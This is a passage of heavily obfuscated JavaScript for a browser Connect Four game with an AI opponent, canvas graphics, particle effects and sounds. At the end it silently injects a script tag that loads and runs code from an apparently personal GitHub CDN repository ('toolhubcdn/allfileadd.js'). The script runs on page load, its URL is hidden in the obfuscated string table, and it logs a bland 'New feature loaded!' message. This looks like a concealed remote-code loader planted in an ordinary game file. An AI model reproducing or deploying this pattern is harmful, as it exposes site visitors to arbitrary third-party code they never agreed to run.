            this[_0x3e73b1(0x85)] = _0x5c00c8;
        });
    }
}
function _0x2d19(_0x17e86e, _0x209e87) {
    const _0x2f93d5 = _0x2f93();
    return _0x2d19 = function (_0x2d1962, _0x3a1a65) {
        _0x2d1962 = _0x2d1962 - 0x80;
        let _0x16330f = _0x2f93d5[_0x2d1962];
        return _0x16330f;
    }, _0x2d19(_0x17e86e, _0x209e87);
}
function initGame() {
    const _0x28b52a = _0x412c73, _0x468fb0 = document['querySelector'](_0x28b52a(0x11d)), _0x379c98 = document[_0x28b52a(0xaf)](_0x28b52a(0x80))[_0x28b52a(0xac)];
    let _0x33073f = [];
    switch (_0x379c98) {
    case _0x28b52a(0xf0):
        _0x33073f = [
            new HumanPlayer(_0x468fb0),
            new AIPlayer(BoardPiece[_0x28b52a(0xa4)])
        ];
        break;
    case _0x28b52a(0x141):
        _0x33073f = [
            new HumanPlayer(_0x468fb0),
            new HumanPlayer(_0x468fb0)
        ];
        break;
    default:
        _0x33073f = [
            new HumanPlayer(_0x468fb0),
            new AIPlayer(BoardPiece[_0x28b52a(0xa4)])
        ];
    }
    gameState[_0x28b52a(0x10d)] = new Game(_0x33073f, _0x468fb0), gameState['board'] = gameState[_0x28b52a(0x10d)][_0x28b52a(0x9e)], gameState[_0x28b52a(0x10d)][_0x28b52a(0x105)]();
}
window[_0x412c73(0xea)](_0x412c73(0xbb), function () {
    const _0xcf763e = _0x412c73, _0x35ea4b = document[_0xcf763e(0xaf)]('.section-canvas');
    gameState[_0xcf763e(0x9e)] = new Board(_0x35ea4b), gameState[_0xcf763e(0x9e)][_0xcf763e(0xd7)](), setTimeout(function () {
        const _0x5c931e = _0xcf763e, _0x5ca823 = document[_0x5c931e(0x140)]('preloader');
        _0x5ca823[_0x5c931e(0xa5)][_0x5c931e(0xa3)] = '0', _0x5ca823[_0x5c931e(0xa5)][_0x5c931e(0xbd)] = _0x5c931e(0xee), setTimeout(() => {
            const _0x3fde79 = _0x5c931e;
            _0x5ca823[_0x3fde79(0xa5)]['display'] = 'none';
        }, 0x320);
    }, 0x7d0);
}), document[_0x412c73(0xea)](_0x412c73(0x132), function () {
    const _0x52bd85 = _0x412c73, _0x1647b2 = document['querySelector'](_0x52bd85(0x11d));
    gameState[_0x52bd85(0x9e)] = new Board(_0x1647b2), gameState['board'][_0x52bd85(0xd7)](), document[_0x52bd85(0xaf)](_0x52bd85(0x11b))[_0x52bd85(0xea)]('click', function () {
        const _0x4a3886 = _0x52bd85, _0x359e63 = document[_0x4a3886(0xaf)](_0x4a3886(0x109));
        _0x359e63[_0x4a3886(0xb8)][_0x4a3886(0xf2)]('invisible'), _0x359e63['addEventListener'](_0x4a3886(0xb9), function () {
            const _0x539062 = _0x4a3886;
            _0x359e63['classList'][_0x539062(0xf2)]('hidden'), initGame();
        });
    }), _0x1647b2[_0x52bd85(0xea)](_0x52bd85(0x131), function () {
        const _0x10e614 = _0x52bd85;
        gameState[_0x10e614(0x10d)] && gameState['game']['gameWon'] && (gameState['game'][_0x10e614(0x115)](), setTimeout(() => gameState[_0x10e614(0x10d)][_0x10e614(0x105)](), 0x64));
    });
});
function createParticles() {
    const _0x32542a = _0x412c73, _0x17d17d = document['getElementById'](_0x32542a(0xf8)), _0x1efe4a = 0x32;
    for (let _0x3f9c03 = 0x0; _0x3f9c03 < _0x1efe4a; _0x3f9c03++) {
        const _0x241ee0 = document[_0x32542a(0xd5)]('div');
        _0x241ee0[_0x32542a(0xb8)][_0x32542a(0xf2)]('particle'), _0x241ee0[_0x32542a(0xa5)][_0x32542a(0x11e)] = Math[_0x32542a(0xe6)]() * 0x64 + '%', _0x241ee0[_0x32542a(0xa5)][_0x32542a(0xe8)] = Math['random']() * 0x6 + 's', _0x241ee0[_0x32542a(0xa5)][_0x32542a(0x9f)] = Math[_0x32542a(0xe6)]() * 0x3 + 0x3 + 's', _0x17d17d[_0x32542a(0xe2)](_0x241ee0);
    }
}
createParticles(), document[_0x412c73(0x10e)]('.mode-option')[_0x412c73(0xe3)](_0x1c977d => {
    const _0x4b39d3 = _0x412c73;
    _0x1c977d[_0x4b39d3(0xea)](_0x4b39d3(0xed), function () {
        const _0x311e85 = _0x4b39d3;
        this[_0x311e85(0xa5)][_0x311e85(0xbd)] = _0x311e85(0x100);
    }), _0x1c977d[_0x4b39d3(0xea)]('mouseleave', function () {
        const _0x33ff11 = _0x4b39d3;
        this['style'][_0x33ff11(0xbd)] = 'scale(1)';
    });
}), document['querySelector'](_0x412c73(0x11b))[_0x412c73(0xea)](_0x412c73(0x131), function (_0x3db2da) {
    const _0x221b40 = _0x412c73, _0x3c2b93 = document[_0x221b40(0xd5)](_0x221b40(0x138)), _0x1cc006 = this[_0x221b40(0x12e)](), _0x19305a = Math[_0x221b40(0x10b)](_0x1cc006[_0x221b40(0x8f)], _0x1cc006[_0x221b40(0xb6)]), _0xa38095 = _0x3db2da[_0x221b40(0xec)] - _0x1cc006[_0x221b40(0x11e)] - _0x19305a / 0x2, _0x348c89 = _0x3db2da[_0x221b40(0x111)] - _0x1cc006[_0x221b40(0xa1)] - _0x19305a / 0x2;
    _0x3c2b93[_0x221b40(0xa5)]['cssText'] = '\x0a\x20\x20\x20\x20\x20\x20\x20\x20position:\x20absolute;\x0a\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20background:\x20rgba(255,\x20255,\x20255,\x200.3);\x0a\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(0);\x0a\x20\x20\x20\x20\x20\x20\x20\x20animation:\x20ripple\x200.6s\x20linear;\x0a\x20\x20\x20\x20\x20\x20\x20\x20width:\x20' + _0x19305a + _0x221b40(0x121) + _0x19305a + _0x221b40(0xda) + _0xa38095 + 'px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20top:\x20' + _0x348c89 + _0x221b40(0xd1), this[_0x221b40(0xe2)](_0x3c2b93), setTimeout(() => {
        const _0x3bfeb3 = _0x221b40;
        _0x3c2b93[_0x3bfeb3(0xd9)]();
    }, 0x258);
});
const style = document[_0x412c73(0xd5)](_0x412c73(0xa5));
style[_0x412c73(0xcc)] = _0x412c73(0x99), document['head'][_0x412c73(0xe2)](style), document['documentElement'][_0x412c73(0xa5)][_0x412c73(0xa6)] = _0x412c73(0xae);
function _0x2f93() {
    const _0x356895 = [
        'hidden',
        'addColorStop',
        '.mode-chooser-input:checked',
        'initConstants',
        '#FF6B6B',
        'length',
        'rgba(255,\x20255,\x20255,\x200)',
        'clickResolver',
        'checkDirection',
        'CANVAS_HEIGHT',
        'unshift',
        'draw3DCircle',
        'showMessage',
        'getColumnFromCoord',
        'getWinner',
        'PLAYER_2_COLOR',
        'rgba(0,\x200,\x200,\x200.3)',
        'width',
        '\x20with\x20score\x20',
        'black',
        'backgroundColor',
        '220xXJlXr',
        '33471wLPpik',
        'https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js',
        'rgba(255,\x20215,\x200,\x200.3)',
        'invisible',
        '55628kTXysY',
        '\x0a\x20\x20\x20\x20\x20\x20@keyframes\x20ripple\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20to\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(4);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20',
        'AudioContext',
        'CANVAS_WIDTH',
        'context',
        'makeMove',
        'board',
        'animationDuration',
        '<h1>Game\x20Over!</h1>',
        'top',
        'EMPTY',
        'opacity',
        'PLAYER_2',
        'style',
        'scrollBehavior',
        'now',
        '#4ECDC4',
        'clearCanvas',
        'enemyPiece',
        '134994rFGlNG',
        'value',
        'drop',
        'smooth',
        'querySelector',
        'innerWidth',
        'script',
        '#0D47A1',
        'gameWon',
        'strokeStyle',
        'canvas',
        'height',
        '45jodqXn',
        'classList',
        'transitionend',
        'destination',
        'load',
        'save',
        'transform',
        'type',
        '2492456xKvYeG',
        'players',
        '100%',
        '#B71C1C',
        's\x20ease-out\x20forwards',
        'maxDepth',
        'gain',
        'cloneBoard',
        '<br>Click\x20the\x20board\x20to\x20play\x20again.',
        'announceWinner',
        'animation',
        'clearRect',
        'drawMask',
        'textContent',
        '#1976D2',
        'getPlayerColor',
        'MASK_COLOR',
        'winningPieces',
        'px;\x0a\x20\x20\x20\x20\x20\x20',
        'PLAYER_1_COLOR',
        'currentPlayerIndex',
        'SCALE',
        'createElement',
        'rgba(255,\x20255,\x20255,\x200.8)',
        'render',
        'beginPath',
        'remove',
        'px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20left:\x20',
        '#0059ff',
        'createRadialGradient',
        '1002710HxZRdS',
        'winnerBoardPiece',
        'fill',
        'setupResize',
        'animateAction',
        'appendChild',
        'forEach',
        'fillStyle',
        '#96CEB4',
        'random',
        'AI\x20Player\x20',
        'animationDelay',
        'getBoardScale',
        'addEventListener',
        'connect',
        'clientX',
        'mouseenter',
        'scale(1.1)',
        'rect',
        'offline-ai',
        'removeEventListener',
        'add',
        'webkitAudioContext',
        '3NHQhhk',
        'abs',
        'exponentialRampToValueAtTime',
        'DRAW',
        'particles',
        'rgba(0,\x200,\x200,\x200.2)',
        '\x20chooses\x20column\x20',
        'resize',
        'min',
        '#ef453b',
        'transparent',
        'currentTime',
        'scale(1.02)',
        'map',
        'boardPiece',
        'restore',
        '\x20wins!\x20🎉',
        'start',
        'sin',
        'evaluateBoard',
        'arc',
        '.mode',
        'confetti',
        'max',
        'applyPlayerAction',
        'game',
        'querySelectorAll',
        'setupClickHandler',
        'minimax',
        'clientY',
        'push',
        'ROWS',
        'floor',
        'reset',
        '\x27s\x20turn',
        'getMove',
        'log',
        'src',
        'drawCircle',
        '.mode-chooser-submit',
        '#d8d8d8',
        '.section-canvas',
        'left',
        'frequency',
        'PIECE_RADIUS',
        'px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20height:\x20',
        'COLUMNS',
        '.message-body-dismiss',
        'createConfettiExplosion',
        'PIECE_STROKE_STYLE',
        'updateMessage',
        'body',
        'rgba(255,\x20255,\x20255,\x200.1)',
        '#45B7D1',
        'column',
        '#FF8A80',
        'isArray',
        'stop',
        'getBoundingClientRect',
        'score',
        'MASK_X_BEGIN',
        'click',
        'DOMContentLoaded',
        'It\x27s\x20a\x20draw!\x20Well\x20played!',
        'rgba(255,\x20215,\x200,\x200.6)',
        'stroke',
        'animationFrame',
        '93522ituNAe',
        'span',
        '2509269iMFaDI',
        'MASK_Y_BEGIN',
        'getValidMoves',
        'win',
        'moveAllowed',
        'New\x20feature\x20loaded!',
        'draw',
        'getElementById',
        'offline-human',
        'Player\x20',
        '#82B1FF'
    ];
    _0x2f93 = function () {
        return _0x356895;
    };
    return _0x2f93();
}
function playSound(_0x1ce265) {
    const _0x300e2f = _0x412c73, _0x2d291a = new (window[(_0x300e2f(0x9a))] || window[(_0x300e2f(0xf3))])(), _0x365cb9 = _0x2d291a['createOscillator'](), _0x5890ee = _0x2d291a['createGain']();
    _0x365cb9[_0x300e2f(0xeb)](_0x5890ee), _0x5890ee[_0x300e2f(0xeb)](_0x2d291a[_0x300e2f(0xba)]);
    let _0xbfc15f, _0x5b774e, _0xbe5a09;
    switch (_0x1ce265) {
    case _0x300e2f(0xad):
        _0xbfc15f = 0xdc + Math['random']() * 0x64, _0x5b774e = 0.2, _0xbe5a09 = 0.3;
        break;
    case 'win':
        _0xbfc15f = [
            523.25,
            659.25,
            783.99
        ], _0x5b774e = 0.15, _0xbe5a09 = 0.5;
        break;
    case _0x300e2f(0x13f):
        _0xbfc15f = 0xdc, _0x5b774e = 0.5, _0xbe5a09 = 0.3;
        break;
    default:
        _0xbfc15f = 0x1b8, _0x5b774e = 0.1, _0xbe5a09 = 0.2;
    }
    if (Array[_0x300e2f(0x12c)](_0xbfc15f)) {
        let _0x6ce3a9 = _0x2d291a[_0x300e2f(0xff)];
        _0xbfc15f[_0x300e2f(0xe3)]((_0x42b174, _0xd8b012) => {
            _0x365cb9['frequency']['setValueAtTime'](_0x42b174, _0x6ce3a9), _0x6ce3a9 += _0x5b774e;
        }), _0x5890ee['gain']['setValueAtTime'](_0xbe5a09, _0x2d291a[_0x300e2f(0xff)]), _0x5890ee[_0x300e2f(0xc5)][_0x300e2f(0xf6)](0.001, _0x2d291a[_0x300e2f(0xff)] + _0x5b774e * _0xbfc15f[_0x300e2f(0x83)]), _0x365cb9[_0x300e2f(0x105)](), _0x365cb9[_0x300e2f(0x12d)](_0x2d291a[_0x300e2f(0xff)] + _0x5b774e * _0xbfc15f['length']);
    } else
        _0x365cb9[_0x300e2f(0xbe)] = 'sine', _0x365cb9[_0x300e2f(0x11f)][_0x300e2f(0xac)] = _0xbfc15f, _0x5890ee['gain'][_0x300e2f(0xac)] = _0xbe5a09, _0x5890ee[_0x300e2f(0xc5)][_0x300e2f(0xf6)](0.001, _0x2d291a['currentTime'] + _0x5b774e), _0x365cb9['start'](), _0x365cb9[_0x300e2f(0x12d)](_0x2d291a[_0x300e2f(0xff)] + _0x5b774e);
}
function loadScript(_0x2a3a8a, _0x4cce04) {
    const _0x44bb4a = _0x412c73, _0x17a62f = document['createElement'](_0x44bb4a(0xb1));
    _0x17a62f[_0x44bb4a(0x119)] = _0x2a3a8a, _0x17a62f['onload'] = _0x4cce04, document['head']['appendChild'](_0x17a62f);
}
loadScript(_0x412c73(0x95), function () {
    const _0x531fab = _0x412c73;
    console['log'](_0x531fab(0x13e));
});